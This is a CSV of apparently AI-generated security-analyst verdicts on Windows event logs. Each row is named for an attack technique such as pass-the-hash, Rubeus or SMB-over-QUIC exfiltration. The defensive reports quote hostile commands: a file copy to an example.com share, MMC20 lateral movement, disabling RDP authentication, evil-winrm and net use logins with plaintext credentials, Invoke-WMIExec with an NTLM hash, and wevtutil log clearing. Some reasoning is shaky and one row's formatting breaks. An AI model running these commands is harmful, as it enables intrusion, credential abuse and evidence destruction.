Directory Name,AI Response
Enable Windows Remote Management,"Upon reviewing the provided logs from the Windows machine on Server002, several indicators of potentially suspicious or malicious activities were identified:

1. **Clearing of Event Logs**: The Sysmon logs reveal multiple instances of `wevtutil.exe` being used to clear event logs across different channels (""Microsoft-Windows-Sysmon/Operational"", ""Application"", and ""System""). The command-line used is consistent with the `wevtutil.exe cl <LogName>` command, which clears logs. This activity is generally suspicious, as attackers often clear logs to cover their tracks after gaining access to a system.

2. **Admin Privileges and High Integrity**: The user `admin_test` has high integrity levels and elevated privileges such as `SeDebugPrivilege`, which are often exploited in privilege escalation attacks. 

3. **PowerShell Activity**: The PowerShell logs indicate the execution of a script `{Enable-PSRemoting -Force}`, which enables PowerShell Remoting on the machine. While this commands itself is not necessarily malicious, enabling PS Remoting without a clear, legitimate purpose in a secured environment could be concerning.

4. **Enabling of PS Remoting**: The execution of `Enable-PSRemoting -Force` is noted in the Sysmon logs, initiated by the user `admin_test`. Although enabling PS Remoting can be part of administrative activities, combined with event log clearing, it may suggest lateral movement preparation or remote command execution setup.

5. **Failed Credential Access Attempts**: Security logs (EventIDs 5379) show multiple credential read attempts using the `MicrosoftAccount:user=02txoixylodcstop`, which returned an error code (3221226021). These attempts indicate failure to retrieve credentials, possibly signifying an attempted unauthorized access or tool trying to extract cached credentials.

6. **Windows Defender Event**: Windows Defender is reported as active (`SECURITY_PRODUCT_STATE_ON`). There are updates for Microsoft Defender Antivirus, suggesting regular maintenance, which could be an attempt to ensure antivirus rules are up-to-date after any potential tampering.

Given the above evidence, the logs contain activities that are indicative of potential malicious actions, particularly the clearing of event logs and PowerShell remoting being enabled without clear justification. These activities warrant further investigation to determine intent and assess potential compromises.

**Assessment**: SUSPICIOUS

**Recommendation**: 

- Conduct a thorough endpoint investigation into the user account `admin_test`, especially focusing on recent activities, any unauthorized changes, and the purpose of actions like log clearing and enabling PS Remoting.
- Review network activity, specifically for any unusual or unauthorized remote connections post-PS Remoting enabling.
- Check the system for additional indicators of compromise such as unauthorized users or services, altered system configurations, and possible persistence mechanisms.
- Consider isolating the system until a comprehensive security assessment is completed to prevent potential lateral movement within the network."
PowerShell Lateral Movement using MMC20,"Upon analyzing the provided event logs from the Windows host, several activities stand out that suggest a potential compromise has occurred:

1. **PowerShell Activity**:
   - The PowerShell logs indicate the execution of a command that starts calculator (`calc.exe`) through the use of `MMC20.application`. The command utilizes `[activator]::CreateInstance([type]::GetTypeFromProgID(""MMC20.application"",""localhost"")).Document.ActiveView.ExecuteShellCommand(""c:\\windows\\system32\\calc.exe"", $null, $null, ""7"")`.
   - This method is suspicious since using MMC (Microsoft Management Console) to launch other processes through PowerShell is an uncommon practice and is often used for bypassing standard execution policies or as a means of obfuscating malicious activities.

2. **Sysmon Logs**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` executions from what appears to be a non-standard directory (`C:\\Users\\admin_test\\Documents\\`). `Wevtutil` is a command-line utility to manage Windows Event logs, and its use in this context could indicate an attempt to clear or manipulate event logs to cover tracks.
   - The repeated clearing of event logs (`System`, `Security`, and `Windows PowerShell`) in such quick succession (`EventID 1102` in Security log and `ID 104` in System log) is particularly concerning and highly indicative of an attempt to obstruct monitoring or remove traces of activity.

3. **Security Logs**:
   - The presence of an event with `EventID 4672` indicates that a login session was granted special privileges, including `SeSecurityPrivilege`, `SeBackupPrivilege`, `SeDebugPrivilege`, etc. These privileges allow a user to perform critical operations, such as modifying security settings, accessing sensitive files, and debugging processes, which access like this could be exploited by a malicious actor to escalate privileges or perform unauthorized actions.

4. **Interesting Patterns**:
   - The combination of PowerShell exploitation with utilities manipulation (like `wevtutil`) and the rapid clearing of various logs strongly suggest a deliberate effort to hide activities.
   - The fact that all actions are being carried out under the same `UserID` SERVER002\\admin_test, adds to the suspicion that an elevated or compromised account is conducting these operations.

**Assessment and Resolution:**
Considering the combination of unconventional PowerShell execution, the clearance of event logs, and high privileges granted during a session, these logs represent indicators of a potential malicious activity. This activity aligns with known methods of operation for certain types of malware and threat actor tactics.

**Resolution: MALICIOUS**

**Recommended Actions:**
- Immediately isolate the system from the network to prevent further proliferation.
- Conduct a comprehensive forensic investigation of the system to identify and understand the full scope of the compromise.
- Review and reset all administrative credentials associated with the system.
- Monitor the environment for any unauthorized access attempts or similar patterns of behavior on other systems."
Exfiltration Over SMB over QUIC (NET USE),"Upon careful analysis of the provided logs from the Windows host, several activities stand out that warrant further examination:

1. **Clearing of Event Logs:**
   - There are multiple `LogFileCleared` events recorded in the System and Security logs indicating that someone with the username `admin_test` has cleared the logs at around the same time for different channels: System, Windows PowerShell, and Security. This is a common tactic used by attackers to cover their tracks.

2. **Use of PowerShell:**
   - The Sysmon and PowerShell logs reveal the execution of a PowerShell command that attempts to map a network drive (`NET USE`) using the PowerShell script: 
     ```
     powershell.exe & {NET USE * '\\example.com\sales' /TRANSPORT:QUIC /SKIPCERTCHECK, copy 'C:\path\to\file.txt' '*:\'}
     ```
     This command not only maps a drive but also copies a file over the mapped drive. The usage of `/SKIPCERTCHECK` can be indicative of malicious intent as it bypasses certificate checks.

3. **Use of `wevtutil.exe`:**
   - The Sysmon logs show multiple executions of `wevtutil.exe`, a command-line utility used to manage event logs. It appears this tool was used in conjunction with the clearing of logs by the `admin_test` user.

4. **Potentially Anomalous Time Adjustment:**
   - The Security log records show Event ID `4616`, indicating a time change was attempted by a service. While this alone isn't conclusive of malicious activity, it might play a role in attempts to manipulate timestamps.

5. **Network Oriented Commands:**
   - The presence of network commands in PowerShell and the attempts to establish network connections using unconventional transport methods such as QUIC could suggest lateral movement or data exfiltration attempts.

Given the combination of these events, particularly the clearing of multiple event logs and the suspicious usage of PowerShell commands that involve network operations, these activities are highly indicative of malicious behavior.

**Resolution: MALICIOUS**

**Assessment:**
The activities logged suggest an active attempt at clandestine operations using administrative privileges. The activities around clearing logs and use of PowerShell for network operations strongly indicate malicious activity, possibly involving data exfiltration and track covering.

**Recommendations:**
- Immediately review the access of the `admin_test` account and consider disabling it until further investigation is complete.
- Conduct a thorough network analysis for any unauthorized data transfers, especially involving the destination in the PowerShell command.
- Implement stricter logging and monitoring, particularly around PowerShell scripts and network operations.
- Consider isolating the affected host from the network while conducting further forensic investigation to prevent further compromise."
Execute command writing output to local Admin Share,"Based on the given logs from the Windows machine ""Server002,"" here is the detailed analysis:

### Summary of Events:

1. **Event Log Clearance:**
   - Multiple instances of the `wevtutil.exe` command were used to clear event logs, specifically the ""System,"" ""Application,"" ""Security,"" and ""Windows PowerShell"" logs. This was executed by a user named `admin_test`.
   - Event IDs 104 (System log), 1102 (Security log) show that these logs were cleared.

2. **Process Execution:**
   - There are repeated executions of `wevtutil.exe`, which is used for managing event logs.
   - Processes like `cmd.exe`, `hostname.exe`, and `whoami.exe` were executed, often chained one after the other, which might indicate scripted activities.
   - Execution of `cmd.exe` with output redirection to an admin share (e.g., `\\127.0.0.1\ADMIN$\output.txt`) is suspicious and could indicate malicious activity, such as data exfiltration or log tampering attempts.

3. **System Time Changes:**
   - Several events (Event ID 24 and 1 from Kernel-General) show that system time was adjusted by the process `svchost.exe`. Although legitimate under some circumstances, the timing with log clearances might indicate attempts to disrupt or confuse log analysis.

4. **Security Auditing:**
   - Events related to credential manager operations (Event ID 5379) failed, indicating possible unauthorized attempts to access account information or credentials.

5. **Windows Update:**
   - Normal updates, such as the Windows Defender update, were logged and seem routine (Event IDs 44, 43, and 19), suggesting that some functionality is intact despite suspicious activities.

### Assessment:
The analysis shows a series of highly suspicious activities:

- Clearing of multiple critical system logs by `admin_test` without an evident legitimate reason is a common tactic to cover tracks after unauthorized activities.
- Execution of utilities typically used for reconnaissance or scripting purposes (`whoami.exe`, `hostname.exe`, and `cmd.exe` with redirected outputs) during the same period raises suspicion.
- The combined presence of log clearing and script-like execution of commands under a single account correlates with potentially malicious behavior.

### Conclusion and Recommendation:

- **Resolution: MALICIOUS:** The actions displayed in the logs demonstrate a clear pattern of malicious intent, suggesting an attempt to hide activities through log clearance and possible unauthorized scanning or information gathering.

### Guidance on How to Proceed:

1. **Immediate Action:**
   - Isolate ""Server002"" from the network to prevent further potential unauthorized access.
   - Conduct a thorough investigation to identify how the malicious actor gained access and assess the extent of compromise.
   
2. **Forensic Analysis:**
   - Retrieve and analyze other system artifacts (e.g., memory dumps, file changes) from the host, focusing on any scripts or automated tasks.
   - Check the logon credentials of `admin_test`, ensure its security, and verify whether it has been compromised.

3. **Preventive Measures:**
   - Review and tighten user access controls, especially for administrative accounts.
   - Implement stricter monitoring and alerting for log clearance activities and unusual command executions, particularly via `wevtutil.exe` and `cmd.exe` chains.

By following these steps, the organization can contain the security incident and fortify its systems against future attacks."
Rubeus Kerberos Pass The Ticket,"Upon examining the provided Windows event logs, I have identified several suspicious activities that indicate potential malicious behavior. Here is a detailed analysis of the logs:

1. **Security Log (LogFileCleared - EventID 1102)**
   - The event log indicates that the security log was cleared by a user identified as ""admin_test"". Clearing logs is a common technique used by attackers to cover their tracks post-exploitation. This action is highly indicative of suspicious behavior.

2. **Windows PowerShell Log**
   - A series of PowerShell events show the execution of a script that makes use of ""PsExec"" and ""Rubeus"". PsExec is a legitimate tool but frequently used by malicious actors to execute commands remotely as it allows for execution with elevated privileges. Rubeus is a known tool used for Kerberos ticket operations, which is often used for credential abuse and lateral movement within a network.
   - The command executed involves retrieving a Ticket Granting Ticket (TGT) and a Ticket Granting Service (TGS) using the ""asktgt"" and ""asktgs"" commands of Rubeus, which clearly indicates a potential Kerberos-based attack.

3. **Sysmon Log**
   - The event logs show multiple instances of the process ""wevtutil.exe"" clearing event logs (Application, System, Security). This activity, combined with the use of PsExec, suggests intent to remove traces of malicious activity from logs.
   - The execution of ""PsExec.exe"" and ""PSEXESVC.exe"" is visible, providing further evidence of remote tool execution on the machine under the admin_test account, corroborating the PowerShell log analysis.

Based on these observations, we have:
- Unauthorized log clearing (Security and other channels).
- Use of PowerShell to execute known hacking tools (Rubeus) with intent to manipulate Kerberos tickets.
- Remote command execution using PsExec, often indicative of lateral movement by cyber attackers.

**Resolution: MALICIOUS**
- The activities suggest a well-orchestrated attack involving credential theft, lateral movement, and potential data exfiltration strategies.
- Immediate incident response actions should be initiated. This includes isolating the affected host, conducting a comprehensive forensic analysis, resetting compromised credentials, and ensuring all systems have been updated with the latest security patches.
- Comprehensive auditing and monitoring should be activated to detect any further or persistent threats in the environment."
Remote Code Execution with PS Credentials Using Invoke-Command,"Upon detailed analysis of the provided logs, several events indicate suspicious behavior that warrants further investigation. Here's a detailed breakdown:

### Security Log Analysis

1. **Event ID 1102 - Security Log Cleared**:
   - The event log indicates that the security logs were cleared by a user `admin_test`. The clearing of event logs can often indicate an attempt to cover tracks post-compromise or during other administrative activity.

2. **Event ID 4672 - Special Privileges Assigned**:
   - The user `admin_test` was assigned a series of special privileges, including `SeDebugPrivilege`, which can be used for privilege escalation or to inject code into other processes if misused.

### Windows PowerShell Log Analysis

1. **Event ID 600 - PowerShell Activity**:
   - A PowerShell script was executed with `Enable-PSRemoting -Force` followed by `Invoke-Command`. This command could indicate lateral movement or reconnaissance activities, especially if executed without prior authorization.

### Sysmon Log Analysis

1. **Process Creation Events (wevtutil.exe)**:
   - Multiple instances of `wevtutil.exe` are found clearing logs (System, Security, Application, Windows PowerShell). This activity, coming just before or after specific suspicious user actions (like assigning special privileges and remoting with PowerShell), is highly suspect and likely an attempt to cover malicious activities.

2. **Suspected Malicious PowerShell Execution**:
   - There are direct executions of `powershell.exe` with potentially harmful intent, such as invoking remote commands and having them execute as `admin_test`.

### Summary of Suspicious Activity

- **Event Log Clearance**: The clearing of logs for multiple types without clear and valid justification is a red flag.
- **Use of Powerful Privileges**: Privileges that ought only to be assigned for legitimate high-security administrative tasks, combined with suspicious log clearing, may suggest improper use.
- **PowerShell Use and Commands**: Usage patterns of PowerShell with remoting capabilities like `Enable-PSRemoting` without clear necessity appear suspicious and suggest potential unauthorized remote operation.

### Resolution

Based on the evidence, the resolution for the given logs can be classified as **MALICIOUS**. The actions taking place are aligned with typical hacking activities, such as privilege escalation, log clearing to erase tracks, and using PowerShell for remote command execution.

Immediate steps should include:
- Performing a thorough forensic analysis to confirm any compromise.
- Resetting or further securing the `admin_test` account and any other compromised accounts.
- Reviewing and possibly revamping auditing policies and security controls, such as ensuring logging cannot be cleared by non-authorized personnel.
- Monitoring for further suspicious activities in real-time and using advanced threat detection solutions.

These actions will help ensure the integrity of the system and help mitigate any potential security breaches."
Disable NLA for RDP via Command Prompt,"Upon analyzing the provided logs, I have identified certain events that stand out as potentially suspicious and require further investigation:

1. **Log Cleared Events**:
   - The presence of multiple log cleared events is concerning, specifically:
     - **EventID 104** in the System log indicates that the System log was cleared by the user `admin_test`.
     - **EventID 1102** in the Security log indicates that the Security log was cleared by the user `admin_test`.
     - The similar action was performed to clear the Windows PowerShell log.
   - Clearing of event logs can often be an indication of malicious activity as attackers attempt to cover their tracks.

2. **Suspicious Command Execution**:
   - The Sysmon log shows the execution of `cmd.exe` with a command to modify the registry key used to control RDP (Remote Desktop Protocol) authentication settings:
     - `cmd.exe /c reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"" /v UserAuthentication /d 0 /t REG_DWORD /f`
   - This modification effectively disables the requirement for user authentication over RDP, which could be used to facilitate unauthorized remote access to the server.

3. **Privilege Escalation and High Integrity Processes**:
   - The user `admin_test` has been observed running processes with high integrity levels, such as `wevtutil.exe`, which is typically used to clear event logs, indicating possible unauthorized use of elevated privileges.
   - **EventID 4672** indicates that `admin_test` has privileges such as `SeDebugPrivilege`, `SeSystemEnvironmentPrivilege`, etc., which are typically indicative of administrative rights.

4. **Time Manipulation**:
   - There are events indicating that the system time was changed multiple times (Security log **EventID 4616**), which is another potential tactic used by attackers to manipulate timestamps and mislead investigators examining logs.

**Assessment**:
- The activity observed across the logs, such as log clearing actions, attempting to disable RDP user authentication via registry changes, and having elevated privileges suggest potential malicious intent.
- While the execution of legitimate Windows processes is recorded, the context in which these actions occurred—such as log clearing and altering RDP settings—is highly suspicious.

**Resolution**: **MALICIOUS**

**Guidance**:
- Immediate action should be taken to conduct a thorough forensic investigation of the affected host (`Server002`) to identify how access was gained and the extent of any potential compromise.
- Review all user accounts with administrative privileges, particularly `admin_test` and consider resetting credentials or disabling the account temporarily.
- Check for any unauthorized changes in RDP configuration and revert these changes.
- Preserve logs and other evidence for further in-depth analysis to determine the full nature and scope of the compromise.
- Consider implementing enhanced monitoring and alerting for any further attempts to clear logs or execute suspicious commands."
crackmapexec Pass the Hash,"Upon reviewing the Windows event logs, several events raise concerns and indicate potential anomalous or malicious activities:

1. **Event Clearing**:
   - **Security Log Cleared (Event ID: 1102)**: This event indicates that the security log has been cleared by the user ""admin_test"" (Security channel). Clearing logs is a common tactic used by attackers to cover tracks and may indicate malicious intent.
   - **System and Windows PowerShell Logs Cleared (Event ID: 104)**: The same user ""admin_test"" also cleared the System and Windows PowerShell logs. This, coupled with the clearing of the security log, is highly suspicious.

2. **Time Change Events (Event ID: 4616)**:
   - There are events indicating changes in system time, which can disrupt log timelines and is usually not a common legitimate operation, especially not multiple times within a sequence. This could potentially be an attempt to mask activities.

3. **Privilege Use (Event ID: 4672)**:
   - The user ""admin_test"" received several high-level privileges such as SeDebugPrivilege and SeTakeOwnershipPrivilege. While not inherently malicious, if used in conjunction with other activities, it may indicate privilege escalation and abuse.

4. **Suspicious Process Execution**:
   - **Sysmon and Command Line Activity**:
     - The user ""SERVER002\\admin_test"" executed `cmd.exe` with arguments that include running ""CrackMapExec"" tool, which is used for reconnaissance and exploitation on Windows networks. This is a clear indicator of penetration testing or malicious activity designed to leverage credentials and escalate privileges.
   - **PowerShell Activity and Execution**:
     - Multiple instances of PowerShell activities were logged without much context due to the logs being cleared. However, the execution paths and times align with other suspicious activities.

5. **Software Protection Platform (sppsvc.exe)**:
   - Normal operations involving Microsoft Edge updates and Software Protection should not raise alarms alone, but in the context of other activities, they could be part of legitimate updates or cover for unauthorized updates or software execution.

In summary, the logs reveal clear indicators of potentially unauthorized and malicious activities. The combination of log clearing, privilege escalation, suspicious command-line executions, and time manipulation form a pattern that strongly suggests malicious actions.

**Resolution**: MALICIOUS

**Guidance on Proceeding:**
- Immediately isolate the affected host (""Server002"") to prevent further potential compromise.
- Conduct a thorough investigation of the system for any backdoors or malware.
- Review access logs and other security controls to identify how the ""admin_test"" account was potentially exploited or used.
- Reset passwords and review access policies and permissions for the users involved.
- Enhance monitoring on other systems within the network to detect similar patterns of behavior."
WinRM Access with Evil-WinRM,"### Analysis of the Logs:

### Suspicious Activities Noted:
1. **Event Log Clearing Activity:**
   - The log entry with Event ID `1102` from the Security log indicates that the security log was cleared by the user `admin_test`. Simultaneously, corresponding entries in the Sysmon and System logs (Event ID `1` and `104` respectively) show usage of `wevtutil.exe` to clear Windows event logs across several channels, which include Microsoft-Windows-Sysmon, Application, System, and Security channels. The clearing of logs is a significant indicator of potential malicious activity, as attackers often clear logs to cover their tracks.

2. **Use of Potentially Malicious PowerShell Commands:**
   - The PowerShell event logs and the corresponding Sysmon log entries detail the execution of a PowerShell command including `evil-winrm`, indicating an attempt to utilize a known red-teaming tool `Evil-WinRM` for accessing Windows Remote Management interfaces. The command: `""powershell.exe"" & {evil-winrm -i Target -u Domain\\Administrator -p P@ssw0rd1}` is suspicious and suggests an unauthorized attempt to gain elevated privileges or perform lateral movement within a network.

3. **High Privilege Credential Access and Failures:**
   - Multiple entries with Event ID `5379` in the Security log suggest failed attempts to retrieve credentials using specific accounts and tokens. Although the documentation of such attempts is not inherently malicious, they are alarming due to the high frequency and repeated failures logged.

4. **Unusual Execution of System Utilities:**
   - Sysmon log entries recording multiple executions of utilities like `wevtutil.exe`, `rundll32.exe`, and repeated launching of PowerShell indicate scripting activity that is typical in malicious or unauthorized administrative tasks when paired with the observed log clearing actions.

### Indicators of Compromise:
- **Log Clearing:** Intentional clearing of event logs across multiple system channels can signify a cover-up effort post-intrusion.
- **Suspicious PowerShell Activity:** Execution of known tools by non-standard users, like `evil-winrm`, is a strong indication of a security breach.

### Resolution:
- **MALICIOUS:**
  - The activities observed, including the use of log-clearing commands and execution of malicious PowerShell commands, are indicative of a security breach. The logs show clear signatures of potentially unauthorized access and malicious intent, highly suggestive of compromise.

Invoke-WMIExec Pass the Hash,"### Detailed Analysis of the Logs

Upon reviewing the provided logs from various channels, here is the detailed analysis highlighting any suspicious or anomalous behavior:

#### Sysmon Log Analysis
1. **Event ID 1 and Event ID 5 - Process Creation and Termination**:
   - Multiple instances of `wevtutil.exe` and `conhost.exe` processes are observed with the `admin_test` user. Typically, `wevtutil.exe` is used to clear event logs, which could be legitimate in some administrative context but could also signify an attempt to cover activity tracks.
   - The commands such as `""C:\Windows\system32\wevtutil.exe"" cl System` indicate an attempt to clear the System event logs. This is particularly suspicious and often associated with malicious activity, as clearing logs can hinder forensic investigations.

2. **Use of PowerShell**:
   - A `powershell.exe` process executes a script from a potentially suspicious URL (`https://raw.githubusercontent.com/.../Invoke-WMIExec.ps1`). This script execution could indicate remote execution or lateral movement attempts using a known PowerShell script for Windows Management Instrumentation (WMI) command execution.

#### Windows PowerShell Log Analysis
- The PowerShell command indicates an intention to execute a remote WMI command using NTLM hashes (`-Hash cc36cf7a8514893efccd3324464tkg1a`). Such behavior is characteristic of Pass-the-Hash attacks, where attackers exploit credential hashes to authenticate or execute commands on other machines without needing password knowledge.

#### Security Log Analysis
- **Event ID 1102 - Log Cleared**:
  - The application, system, and security logs have been cleared by the `admin_test` user, which is a red flag. This action often indicates malicious intent to remove traces of unauthorized activity.

#### System Log Analysis
- **Event ID 104 - Log Cleared**:
  - Logs show that the system and Windows PowerShell logs were cleared almost simultaneously by the `admin_test` user, further reinforcing the suspicion of malicious intent.

#### Overall Observations
- The combination of sysmon, powershell, security, and system logs indicates a pattern of potentially malicious activity:
  - Use of `wevtutil.exe` to clear event logs.
  - Use of a PowerShell script from an external source which may execute remote commands using stolen credentials.
  - Clearing critical logs to obstruct forensic analysis.

### Assessment and Resolution

Based on the analysis, the processes observed, especially the combination of suspicious PowerShell activities and concurrent clearing of event logs, strongly suggest malicious activity. The actions described above are consistent with attempts to maintain persistence, escalate privileges, cover tracks, and potentially move laterally within a network using compromised administrator credentials.

**Resolution:** MALICIOUS

### Guidance on How to Proceed
- **Immediate Actions:**
  - Isolate the affected system (`Server002`) from the network to prevent further propagation of potential threats.
  - Initiate a full forensic investigation to uncover the extent of the compromise.
  - Reset credentials for the user `admin_test` and check for possible unauthorized privilege escalations.

- **Preventive Measures:**
  - Review and adjust access controls and permissions to minimize exposure.
  - Implement stricter monitoring and alerting on the execution of potentially harmful commands such as PowerShell scripts from untrusted sources.
  - Regularly audit and monitor the clearing of event logs, especially by administrative users.

- **Long-term Actions:**
  - Conduct a thorough review of remote access policies and security configurations to reinforce defenses against Pass-the-Hash and lateral movement tactics.
  - Increase user awareness and training regarding cybersecurity threats and best practices.

The above steps should be taken to address the identified threat and prevent similar incidents in the future."
Map admin share,"Upon analyzing the provided Windows event logs, several indicators suggest suspicious activity that warrants further investigation. Here's a breakdown of the findings:

### Suspicious or Anomalous Behavior:

1. **Clearing of Event Logs:**
   - Multiple instances of log clearing are captured in the logs:
     - `EventID 104` in the System log for the ""System"" channel.
     - `EventID 104` for the ""Windows PowerShell"" channel.

   - `EventID 1102` in the Security log indicates that the security log was cleared.

   Clearing event logs, especially security-related logs, is a common tactic employed by threat actors to cover their tracks post-compromise.

2. **Unauthorized Command Execution:**
   - The execution of `cmd.exe` to map a network share using credentials (`net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator`) is captured in the logs. This could represent lateral movement or unauthorized access to network resources using privileged credentials.

3. **Use of Powerful Privileges:**
   - The `admin_test` account had privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeTakeOwnershipPrivilege`, and others, which are typically associated with high-level administrative activities. The presence of these privileges raises the possibility of privilege misuse or escalation.

### Assessment:

The combination of event log clearing and suspicious network share mounting using administrator privileges strongly suggests that malicious activities are likely occurring.

- **Log Clearing:** This action, particularly when involving security logs, raises immediate red flags as it implies a deliberate attempt to obfuscate malicious actions.
- **Network Share Access with Admin Credentials:** The command `net use` to map network drives with administrator credentials suggests unauthorized access or infrastructure enumeration intentions potentially marking a lateral movement attempt.

### Guidance and Resolution:

Given the activities observed, especially the clearing of various logs and unauthorized credential use, the situation should be treated as potentially **MALICIOUS**:

1. **Immediate Actions:**
   - **Isolate the System:** Temporarily remove the affected host from the network to prevent further spread or data exfiltration.
   - **Account Auditing:** Review any use of high-privilege accounts (`admin_test`) across the network.
   - **Credential Reset:** Force a reset of all relevant administrative credentials, especially those detected in suspicious activities.

2. **In-Depth Investigation Required:**
   - **Forensic Analysis:** Conduct a comprehensive forensic analysis to determine the extent of the compromise and any potential data loss.
   - **Network Traffic Analysis:** Review network logs for indications of data exfiltration or communications with malicious external IPs.

3. **System Hardening:**
   - Implement stricter logging controls and monitor any further instances of log tampering.
   - Review and minimize account privileges following a principle of least privilege.

This situation demands immediate and thorough actions to ensure containment and an assurance of security posture post-incident."
Radmin Viewer Utility,"After analyzing the provided event logs from the Windows machine, here is a detailed assessment of the situation:

1. **Process Execution Analysis**:
   - There are multiple logs showing executions of legitimate Microsoft processes such as `MicrosoftEdgeUpdate.exe`. These processes are associated with Microsoft Edge updates and appear to be operating under the `NT AUTHORITY\SYSTEM` context, which is typical for system updates carried out by Microsoft software.
   
2. **Use of `wevtutil.exe`**:
   - The logs contain multiple entries for the execution of `wevtutil.exe` (Windows Event Command Line Utility) by the `admin_test` user. The process is used for clearing log files: `cl Microsoft-Windows-Sysmon/Operational`, `cl Application`, `cl System`, and `cl ""Windows PowerShell""`.
   - This activity is suspicious as `wevtutil.exe` is being used to clear critical event logs, possibly as an attempt to hide malicious activity.

3. **`cmd.exe` Execution**:
   - There is an instance of `cmd.exe` executing with the command line `""cmd.exe"" /c ""%%PROGRAMFILES(x86)%%/Radmin Viewer 3/Radmin.exe""`. This command is directed towards executing `Radmin.exe`, a known remote administration tool.
   - While Radmin can be used legitimately, its presence in this context may indicate unauthorized remote access, especially if the installation of Radmin was not sanctioned by company policies.

4. **Log Clearing**:
   - The system and security logs show events indicating they have been cleared by the `admin_test` user. This is a classic sign of activity trying to cover tracks and prevent detection of malicious actions.

5. **Absence of Non-Benign PowerShell Event**:
   - Although PowerShell is present in the logs, there are no specific commands or scripts captured which could directly show malicious intent. However, the absence of detailed PowerShell event logs due to their clearance highlights suspicious behavior.

Given these observations, the activity surrounding the clearing of event logs, use of `wevtutil.exe`, execution of `Radmin.exe`, and the clearing of logs by `admin_test` suggests an attempt to obfuscate potentially unauthorized or malicious actions. These behaviors align more closely with tactics used to maintain persistence and cover tracks within compromised environments.

**Conclusion**:
The conclusion based on the analysis is that the logs contain activity indicative of potential compromise, thus categorized as:

- **Resolution: MALICIOUS**

**Guidance**:
- Immediate containment actions are advised, including isolating the host from the network to prevent further remote access or data exfiltration.
- Conduct a thorough investigation to determine the scope and origin of the compromise, including examining any remote access tools installed.
- Review the `admin_test` user's activity and credentials, and consider resetting credentials or disabling the account until the investigation is concluded.
- Restore System, Security, and Application logs from backups if possible to gather more context about the cleared activity.
- Increase monitoring and ensure all security patches and antivirus definitions are up to date."
Map Admin Share PowerShell,"### Analysis of Logs

Upon reviewing the provided logs, several events indicate potentially malicious activities on a Windows machine, specifically focusing on log file clearing events, command execution, and user activity.

#### Suspicious Activities:
1. **Log File Clearing Events:**
   - The `EventID 104` in the System logs reports that the logs for the System and Windows PowerShell were cleared by the user `admin_test` at `2024-10-21 11:08:24`. Similarly, the `Security log` is cleared right after, as noted by `EventID 1102`.
   - Clearing logs is often performed to cover tracks after unauthorized or suspicious activity, suggesting an attempt to obstruct forensic investigations.

2. **Command Execution and Process Activity:**
   - **PowerShell Commands:** There are multiple PowerShell events (EventID 600) indicating execution of a command creating a new PSDrive that points to a network path (`\\Target\\C$`). This action is suspicious as it could be an attempt to access or exfiltrate data from the target system.
   - **Wevtutil Exe Usage:** In the Sysmon logs, several entries show the execution of `wevtutil.exe` to clear logs (`ProcessId 6052, 5688, 5884`). This further supports the hypothesis that there's an effort to hide malicious actions on this system.
   - **Repeated Execution of Administrative Tasks:** There are multiple logons (EventID 4624) and special privilege assignments (EventID 4672) for `admin_test` within the same timeframe, indicating the possibility of privilege escalation or lateral movement.

3. **Time Manipulation:**
   - Logs indicate changes in system time (`EventID 4616`) issued by `svchost.exe`, which can disrupt log timelines and complicate investigations.

#### Indicators of Malicious Intent:
- **Log Tampering:** Frequent clearing of logs by `admin_test` is a major red flag pointing towards intentions to cover up malicious activities.
- **Unusual PowerShell Execution:** Execution of commands that create network shares or access paths to other systems suggests unauthorized access attempts.
- **Privilege Escalation:** The acquisition of multiple high-level privileges (e.g., `SeDebugPrivilege`) indicates the presence of actions requiring elevated permissions and suggests possible privilege escalation.

### Assessment
Considering the frequent log clearing activities, suspicious PowerShell usage, and privilege escalation attempts, the logs provide strong indications of potentially malicious activity occurring on the system. The actions observed are characteristic of an attacker trying to cover their tracks post-activity execution.

### Resolution
- **MALICIOUS**

### Recommendations for Further Action:
1. **Isolate the Host:** Immediately isolate the affected machine (Server002) from the network to prevent further compromise.
2. **Conduct Detailed Forensics:** Perform a thorough forensic analysis to determine the extent of the intrusion and data accessed or exfiltrated.
3. **Review and Harden Security Protocols:** Review and strengthen security controls, including log monitoring, PowerShell execution policies, and user privilege management.
4. **Network Monitoring and Incident Response:** Enhance network monitoring for any indications of further intrusion attempts and establish an incident response to address any potential breaches quickly.

These measures will help mitigate any present threats and prevent future incidents of a similar nature."
Exfiltration Over SMB over QUIC (New-SmbMapping),"Based on the provided log entries, here's a detailed analysis focusing on identifying any potential indicators of malicious activity:

### Summary of Logs:
1. **Sysmon Logs**:
   - Multiple instances of `wevtutil.exe` being executed with the `cl` (clear logs) command for various logs (e.g., Sysmon, Application, System, Security, and Windows PowerShell).
   - Logs cleared while a high-integrity process was initiated from the `admin_test` user.

2. **Security Logs**:
   - Event ID 1102, which indicates that the security log was cleared. This can be a critical indicator of malicious intent as log clearing is often done to cover tracks after unauthorized or suspicious activities.

3. **PowerShell Logs**:
   - Recorded execution of a PowerShell command to map a network drive and copy files. The connection uses the QUIC protocol with `-SkipCertificateCheck`, which may indicate suspicious activity if not clearly authorized, as it bypasses security checks.
   - The connection to a potentially suspicious network path without proper security checks.

4. **Application Logs**:
   - Various Edge Update operations; typically benign, except that they coincide with other suspicious activities (log clearing).

5. **System Logs**:
   - Cleared logs across various channels (System, Windows PowerShell).

### Assessment of Malicious Activity:
- **Indicators of Malicious Activity**:
  - **Log Clearing**: The clearing of all primary logs (Sysmon, Application, Security, System, and Windows PowerShell) is highly suspicious, often indicating an attempt to hide malicious activity.
  - **PowerShell Command**: The use of PowerShell with parameters that skip certificate checks and map a network drive.
  - **Execution of `wevtutil.exe`**: This often precedes log deletion which, when linked to a non-routine context or without prior approval, is suspicious.

- **Potential Threats/Risks**:
  - High risk of unauthorized access, data exfiltration, or compromise of integrity as evidenced by logs being deliberately cleared.
  - Possible lateral movement or persistence attempts using PowerShell.

### Guidance:
- **Immense Priority**: Immediately conduct a more complete forensic investigation.
- **Containment**: Restrict network access from the involved host (Server002) and monitor traffic for unusual patterns.
- **Host Review**: Analyze the affected system for malware or signs of compromise (e.g., unrecognized scheduled tasks, scripts, or unusual outbound connections).
- **User Activity Audit**: Review other activities related to the `admin_test` user across systems.

### Resolution:
- **Resolution**: Based on the preponderance of evidence suggesting deliberate log clearing and potentially suspicious PowerShell activities, this case is determined to be **MALICIOUS**. Immediate investigation and incident response measures are warranted."
